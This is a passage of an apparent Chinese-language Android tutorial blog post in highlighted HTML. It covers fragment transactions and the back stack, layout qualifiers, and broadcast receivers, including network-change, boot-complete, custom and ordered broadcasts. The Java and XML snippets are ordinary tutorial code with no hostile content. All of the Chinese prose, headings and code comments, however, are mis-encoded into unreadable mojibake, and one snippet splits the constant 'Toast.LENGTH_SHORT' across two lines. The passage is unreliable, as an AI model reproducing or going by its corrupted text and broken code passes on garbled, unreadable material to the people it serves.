class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(<span class="meta">@NonNull</span> LayoutInflater inflater, <span class="meta">@Nullable</span> ViewGroup container, <span class="meta">@Nullable</span> Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        View view=inflater.inflate(R.layout.another_right_fragment,container,<span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> view;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;FrameLayout</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/right_layout&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>main.javaå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">button</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">        button.setOnClickListener(<span class="built_in">this</span>);</span><br><span class="line">        replaceFragment(<span class="keyword">new</span> <span class="title class_">RightFragment</span>());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.button:</span><br><span class="line">                replaceFragment(<span class="keyword">new</span> <span class="title class_">AnotherRightFragment</span>());</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">replaceFragment</span><span class="params">(Fragment fragment)</span> &#123;</span><br><span class="line">        <span class="type">FragmentManager</span> <span class="variable">fragmentManager</span> <span class="operator">=</span> getSupportFragmentManager();</span><br><span class="line">        <span class="type">FragmentTransaction</span> <span class="variable">transaction</span> <span class="operator">=</span> fragmentManager.beginTransaction();</span><br><span class="line">        transaction.replace(R.id.right_layout, fragment);</span><br><span class="line">        transaction.addToBackStack(<span class="literal">null</span>);</span><br><span class="line">        transaction.commit();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="ç¢ç‰‡ä¸­æ¨¡æ‹Ÿè¿”å›æ ˆ">ç¢ç‰‡ä¸­æ¨¡æ‹Ÿè¿”å›æ ˆ</h4><p>é€šè¿‡ç‚¹å‡»æŒ‰é’®æ·»åŠ ç¢ç‰‡åï¼ŒæŒ‰Backé”®ç¨‹åºè‡ªåŠ¨é€€å‡ºï¼Œå¦‚æœæ¨¡æ‹Ÿç±»ä¼¼è¿”å›æ ˆæ•ˆæœï¼Œå¦‚ä¸‹</p><p>åœ¨FragmentTransactionæä¾›çš„addToBackStack()ï¼Œç”¨äºå°†ä¸€ä¸ªäº‹åŠ¡æ·»åŠ åˆ°è¿”å›æ ˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">replaceFragment</span><span class="params">(Fragment fragment)</span> &#123;</span><br><span class="line">        <span class="type">FragmentManager</span> <span class="variable">fragmentManager</span> <span class="operator">=</span> getSupportFragmentManager();</span><br><span class="line">        <span class="type">FragmentTransaction</span> <span class="variable">transaction</span> <span class="operator">=</span> fragmentManager.beginTransaction();</span><br><span class="line">        transaction.replace(R.id.right_layout, fragment);</span><br><span class="line">    </span><br><span class="line">        transaction.addToBackStack(<span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">        transaction.commit();</span><br></pre></td></tr></table></figure><h4 id="ç¢ç‰‡å’Œæ´»åŠ¨è¿›è¡Œé€šä¿¡">ç¢ç‰‡å’Œæ´»åŠ¨è¿›è¡Œé€šä¿¡</h4><p><strong>æ´»åŠ¨ä¸ç¢ç‰‡é€šä¿¡</strong></p><p>è·å¾—ç¢ç‰‡å®ä¾‹,å°±å¯ä»¥è°ƒç”¨ç¢ç‰‡é‡Œçš„æ–¹æ³•</p><p><code>RightFragment rightFragment=getFragmentManager().findFragmentById(R.id.right_fragment);</code></p><p><strong>ç¢ç‰‡ä¸æ´»åŠ¨é€šä¿¡</strong></p><p>è·å¾—ä¸ç¢ç‰‡å…³è”çš„æ´»åŠ¨å®ä¾‹</p><p>MainActivity activity = (MainActivity) getActivity();</p><h4 id="åŠ¨æ€åŠ è½½å¸ƒå±€æŠ€å·§">åŠ¨æ€åŠ è½½å¸ƒå±€æŠ€å·§</h4><p>å®ç° ç¨‹åºå¯ä»¥æ ¹æ®è®¾å¤‡çš„åˆ†è¾¨ç‡æˆ–è€…å±å¹•å¤§å°åœ¨è¿è¡Œæ—¶æ¥å†³å®šåŠ è½½é‚£ä¸ªå¸ƒå±€</p><h5 id="ä½¿ç”¨é™å®šç¬¦">ä½¿ç”¨é™å®šç¬¦</h5><p>ä¿®æ”¹FragmentTesté¡¹ç›®çš„activity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>åœ¨resæ–‡ä»¶å¤¹ä¸‹æ–°å»ºlayout-largeæ–‡ä»¶å¤¹ï¼Œé‡Œé¢æ–°å»ºactivity_main.xml</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/left_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.LeftFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;1&quot;</span>/&gt;</span><br><span class="line">&lt;fragment</span><br><span class="line">        android:<span class="attribute">id</span>=<span class="string">&quot;@+id/right_fragment&quot;</span></span><br><span class="line">        android:<span class="attribute">name</span>=<span class="string">&quot;com.example.fragmenttest.RightFragment&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_width</span>=<span class="string">&quot;0dp&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span><br><span class="line">        android:<span class="attribute">layout_weight</span>=<span class="string">&quot;3&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><p>ä¸Šé¢é‚£ä¸ªæ–‡ä»¶å¤¹çš„<code>large</code>å°±æ˜¯é™å®šç¬¦ï¼Œå°å±å¹•åŠ è½½layoutä¸‹å¸ƒå±€ å¤§å±å¹•åŠ è½½layout-largeä¸‹å¸ƒå±€</p><p><img src="/posts/69766bbb.htm/image-20240725103301782.png" alt="image-20240725103301782"></p><p><img src="/posts/69766bbb.htm/image-20240725103310000.png" alt="image-20240725103310000"></p><h5 id="ä½¿ç”¨æœ€å°é™å®šç¬¦">ä½¿ç”¨æœ€å°é™å®šç¬¦</h5><p>æ–°å»ºlayout-sw600dpæ–‡ä»¶å¤¹ï¼Œä¸‹é¢æ–°å»ºactivity_main.xmlå¸ƒå±€</p><p>å½“ç¨‹åºè¿è¡Œåœ¨å±å¹•å®½åº¦å¤§äº600dpæ—¶ åŠ è½½layout-sw600dpæ–‡ä»¶å¤¹ä¸‹å¸ƒå±€ï¼Œååˆ™æ­£å¸¸åŠ è½½ã€‚</p><h3 id="å¹¿æ’­æ¥å—è€…">å¹¿æ’­æ¥å—è€…</h3><p><strong>æ ‡å‡†å¹¿æ’­</strong> ï¼ˆNormal broadcastsï¼‰æ˜¯ä¸€ç§å®Œå…¨å¼‚æ­¥æ‰§è¡Œçš„å¹¿æ’­ï¼Œåœ¨å¹¿æ’­å‘å‡ºä¹‹åï¼Œæ‰€æœ‰çš„å¹¿æ’­æ¥æ”¶å™¨å‡ ä¹éƒ½ä¼šåœ¨åŒä¸€æ—¶åˆ»æ¥æ”¶åˆ°è¿™æ¡å¹¿æ’­æ¶ˆæ¯ï¼Œå› æ­¤å®ƒä»¬ä¹‹é—´æ²¡æœ‰ä»»ä½•å…ˆåé¡ºåºå¯è¨€ã€‚è¿™ç§å¹¿æ’­çš„æ•ˆç‡ä¼šæ¯”è¾ƒé«˜ï¼Œä½†åŒæ—¶ä¹Ÿæ„å‘³ç€å®ƒæ˜¯æ— æ³•è¢«æˆªæ–­çš„ã€‚</p><p><strong>æœ‰åºå¹¿æ’­</strong> ï¼ˆOrdered broadcastsï¼‰åˆ™æ˜¯ä¸€ç§åŒæ­¥æ‰§è¡Œçš„å¹¿æ’­ï¼Œåœ¨å¹¿æ’­å‘å‡ºä¹‹åï¼ŒåŒä¸€æ—¶åˆ»åªä¼šæœ‰ä¸€ä¸ªå¹¿æ’­æ¥æ”¶å™¨èƒ½å¤Ÿæ”¶åˆ°è¿™æ¡å¹¿æ’­æ¶ˆæ¯ï¼Œå½“è¿™ä¸ªå¹¿æ’­æ¥æ”¶å™¨ä¸­çš„é€»è¾‘æ‰§è¡Œå®Œæ¯•åï¼Œå¹¿æ’­æ‰ä¼šç»§ç»­ä¼ é€’ã€‚æ‰€ä»¥æ­¤æ—¶çš„å¹¿æ’­æ¥æ”¶å™¨æ˜¯æœ‰å…ˆåé¡ºåºçš„ï¼Œä¼˜å…ˆçº§é«˜çš„å¹¿æ’­æ¥æ”¶å™¨å°±å¯ä»¥å…ˆæ”¶åˆ°å¹¿æ’­æ¶ˆæ¯ï¼Œå¹¶ä¸”å‰é¢çš„å¹¿æ’­æ¥æ”¶å™¨è¿˜å¯ä»¥æˆªæ–­æ­£åœ¨ä¼ é€’çš„å¹¿æ’­ï¼Œè¿™æ ·åé¢çš„å¹¿æ’­æ¥æ”¶å™¨å°±æ— æ³•æ”¶åˆ°å¹¿æ’­æ¶ˆæ¯äº†ã€‚</p><p><strong>æ¥æ”¶ç³»ç»Ÿå¹¿æ’­</strong></p><h5 id="åŠ¨æ€æ³¨å†Œç›‘å¬ç½‘ç»œå˜åŒ–">åŠ¨æ€æ³¨å†Œç›‘å¬ç½‘ç»œå˜åŒ–</h5><p>æ–°å»ºä¸€ä¸ªç±»ï¼Œè®©å®ƒç»§æ‰¿è‡ª<code>BroadcastReceiver</code> ï¼Œå¹¶é‡å†™çˆ¶ç±»çš„<code>onReceive()</code> æ–¹æ³•ã€‚å½“æœ‰å¹¿æ’­åˆ°æ¥æ—¶ï¼Œ<code>onReceive()</code> æ–¹æ³•å°±ä¼šå¾—åˆ°æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> IntentFilter intentFilter;</span><br><span class="line">    <span class="keyword">private</span> NetworkChangeReceiver networkChangeReceiver;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="comment">// åˆ›å»ºä¸€ä¸ªintentè¿‡æ»¤å™¨</span></span><br><span class="line">        intentFilter = <span class="keyword">new</span> <span class="title class_">IntentFilter</span>();</span><br><span class="line">        <span class="comment">// æ·»åŠ æƒ³è¦æ¥æ”¶çš„intentè¯·æ±‚</span></span><br><span class="line">        intentFilter.addAction(<span class="string">&quot;android.net.conn.CONNECTIVITY_CHANGE&quot;</span>);</span><br><span class="line">        <span class="comment">// å®ä¾‹åŒ– Receiverç±»</span></span><br><span class="line">        networkChangeReceiver = <span class="keyword">new</span> <span class="title class_">NetworkChangeReceiver</span>();</span><br><span class="line">        <span class="comment">// åŠ¨æ€æ³¨å†Œå¹¿æ’­æ¥æ”¶è€…</span></span><br><span class="line">        registerReceiver(networkChangeReceiver, intentFilter);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onDestroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onDestroy();</span><br><span class="line">        <span class="comment">// å–æ¶ˆæ³¨å†Œå¹¿æ’­æ¥æ”¶è€…</span></span><br><span class="line">        unregisterReceiver(networkChangeReceiver);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            <span class="comment">// å½“æ”¶åˆ°å¹¿æ’­æ—¶ï¼Œå¼¹çª—æç¤ºç½‘ç»œçŠ¶æ€æ”¹å˜</span></span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;network changes&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ–è€…å½“ç½‘ç»œçŠ¶æ€æ”¹å˜æ—¶ï¼Œæç¤ºå½“å‰æœ‰ç½‘ç»œè¿˜æ˜¯æ— ç½‘ç»œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">NetworkChangeReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">            <span class="comment">// å¾—åˆ°ConnectivityManagerå®ä¾‹(ä¸€ä¸ªç³»ç»ŸæœåŠ¡ç±»ï¼Œä¸“é—¨ç”¨äºç®¡ç†ç½‘ç»œè¿æ¥)</span></span><br><span class="line">            <span class="type">ConnectivityManager</span> <span class="variable">connectionManager</span> <span class="operator">=</span> (ConnectivityManager)getSystemService(Context.CONNECTIVITY_SERVICE);</span><br><span class="line">            <span class="comment">// å¾—åˆ°NetworkInfoçš„å®ä¾‹</span></span><br><span class="line">            <span class="type">NetworkInfo</span> <span class="variable">networkInfo</span> <span class="operator">=</span> connectionManager.getActiveNetworkInfo();</span><br><span class="line">            <span class="comment">// é€šè¿‡è°ƒç”¨NetworkInfoçš„isAvailable()æ–¹æ³•ï¼Œæ¥åˆ¤æ–­å‡ºå½“å‰æœ‰æ— ç½‘ç»œ</span></span><br><span class="line">            <span class="keyword">if</span> (networkInfo != <span class="literal">null</span> &amp;&amp; networkInfo.isAvailable()) &#123;</span><br><span class="line">                Toast.makeText(context, <span class="string">&quot;network is available&quot;</span>,</span><br><span class="line">                    Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Toast.makeText(context, <span class="string">&quot;network is unavailable&quot;</span>,</span><br><span class="line">                    Toast.LENGTH_SHORT).show();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ—¶ï¼Œè®¿é—®ç½‘ç»œçŠ¶æ€éœ€è¦åœ¨<code>AndroidManifest.xml</code>ä¸­å£°æ˜æƒé™</p><h5 id="é™æ€æ³¨å†Œå®ç°å¼€æœºå¯åŠ¨æé†’">é™æ€æ³¨å†Œå®ç°å¼€æœºå¯åŠ¨æé†’</h5><p>éœ€è¦åœ¨<code>AndroidManifest.xml</code>ä¸­æ³¨å†Œreceiver</p><p><receiver android:name=".BootCompleteReceiver" android:enabled="true" android:exported="true"><br><intent-filter><br><!-- å¼€æœºäº‹ä»¶å¹¿æ’­ --><br><action android:name="android.intent.action.BOOT_COMPLETED"><br></action></intent-filter><br></receiver></p><p>åŒæ—¶éœ€è¦æ·»åŠ ç›¸åº”ç›‘å¬å¼€æœºçš„æƒé™</p><p>ä¹‹åä¾¿å¯ä»¥æ·»åŠ ä¸€ä¸ªReceiver.javaï¼Œå¹¶åœ¨<code>onReceive()</code>ä¸­ç¼–å†™ç›¸åº”æ§åˆ¶é€»è¾‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BootCompleteReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;Boot Complete&quot;</span>, Toast.LENGTH_LONG).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è¦åœ¨<code>onReceive()</code> æ–¹æ³•ä¸­æ·»åŠ è¿‡å¤šçš„é€»è¾‘æˆ–è€…è¿›è¡Œä»»ä½•çš„è€—æ—¶æ“ä½œï¼Œå› ä¸ºåœ¨å¹¿æ’­æ¥æ”¶å™¨ä¸­æ˜¯ä¸å…è®¸å¼€å¯çº¿ç¨‹çš„ï¼Œå½“<code>onReceive()</code> æ–¹æ³•è¿è¡Œäº†è¾ƒé•¿æ—¶é—´è€Œæ²¡æœ‰ç»“æŸæ—¶ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™ã€‚</p><h5 id="å‘é€è‡ªå®šä¹‰å¹¿æ’­">å‘é€è‡ªå®šä¹‰å¹¿æ’­</h5><p>å‘é€æ ‡å‡†å¹¿æ’­</p><p>å®šä¹‰ä¸€ä¸ªè‡ªå·±çš„å¹¿æ’­æ¥æ”¶å™¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyBroadcastReceiver</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        Toast.makeText(context, <span class="string">&quot;received in MyBroadcastReceiver&quot;</span>, Toast.LENGTH_</span><br><span class="line">            SHORT).show();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥æ”¶ä¸€ä¸ªå€¼ä¸º<code>com.example.broadcasttest.MY_BROADCAST</code>çš„å¹¿æ’­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    sendBroadcast(intent);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åŒ</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">    intent.setAction(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    intent.setPackage(<span class="string">&quot;com.example.broadcasttest&quot;</span>);</span><br><span class="line">    sendBroadcast(intent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºå¹¿æ’­æ˜¯ä½¿ç”¨Intentè¿›è¡Œä¼ é€’çš„ï¼Œå› æ­¤ä½ è¿˜å¯ä»¥åœ¨Intentä¸­æºå¸¦ä¸€äº›æ•°æ®ä¼ é€’ç»™å¹¿æ’­æ¥æ”¶å™¨ã€‚</p><p>å‘é€æœ‰åºå¹¿æ’­</p><p>å‘é€æ—¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">        <span class="title class_">Intent</span>(<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span>);</span><br><span class="line">    sendOrderedBroadcast(intent, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¥æ”¶æ—¶ï¼Œé€šè¿‡<code>android.priority</code>å±æ€§æ¥è®¾ç½®ä¼˜å…ˆçº§</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">&quot;.MyBroadcastReceiver&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;100&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.broadcasttest.MY_BROADCAST&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>åŒæ—¶é€šè¿‡<code>abortBroadcast()</code>æ–¹æ³•æ¥æˆªæ–­å¹¿æ’­ï¼ˆä¹‹åçš„å¹¿æ’­æ¥æ”¶å™¨æ— æ³•æ”¶åˆ°ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    Toast.makeText(context, <span class="string">&quot;received in MyBroadcastReceiver&quot;</span>,</span><br><span class="line">        Toast.LENGTH_SHORT).show();</span><br><span class="line">    abortBroadcast();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 